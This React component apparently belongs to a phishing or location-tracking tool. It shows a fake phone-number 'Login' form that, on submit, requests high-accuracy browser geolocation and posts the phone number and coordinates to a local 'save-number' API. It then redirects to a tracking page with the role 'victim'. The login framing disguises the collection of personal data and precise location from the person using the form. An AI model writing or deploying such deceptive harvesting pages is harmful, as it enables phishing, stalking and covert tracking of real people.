import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "./MainSection.css";
import phone_icon from "../images/phone_icon.jpg";
export default function MainSection() {
  const [phoneOrEmail, setPhoneOrEmail] = useState("");
  const navigate = useNavigate();
  const handleLogin = async (e) => {
    e.preventDefault();
    if (!phoneOrEmail.trim()) {
      alert("Please enter your registered phone number or email");
      return;
    }
    const phoneRegex = /^\d{10}$/;
    if (!phoneRegex.test(phoneOrEmail)) {
      alert("Phone number must be exactly 10 digits");
      return;
    }
    try {
      // Try to capture geolocation to send along with the phone number
      const coords = await new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          (pos) =>
            resolve({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
            }),
          () => resolve(null),
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      });

      const response = await fetch("http://localhost:5050/api/save-number", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone: phoneOrEmail,
          latitude: coords?.latitude,
          longitude: coords?.longitude,
        }),
      });
      const data = await response.json();
      if (response.ok) {
        alert(data.message);
        navigate(`/track?role=victim&id=${data.id || "victim1"}`);
      } else {
        alert(data.message);
      }
    } catch (err) {
      console.error("Error connecting to server:", err);
      alert("Server error. Try again later.");
    }
  };
  return (
    <div className="main-container">
      <form className="login-form" onSubmit={handleLogin}>
        <div className="input-wrapper">
          <img src={phone_icon} alt="phone" className="phone-icon" />
          <input
            type="text"
            placeholder="Enter 10-digit Mobile Number"
            className="mobile-input"
            value={phoneOrEmail}
            onChange={(e) => setPhoneOrEmail(e.target.value)}
          />
        </div>
        <button type="submit" className="login-btn">Login</button>
      </form>
    </div>
  );
}
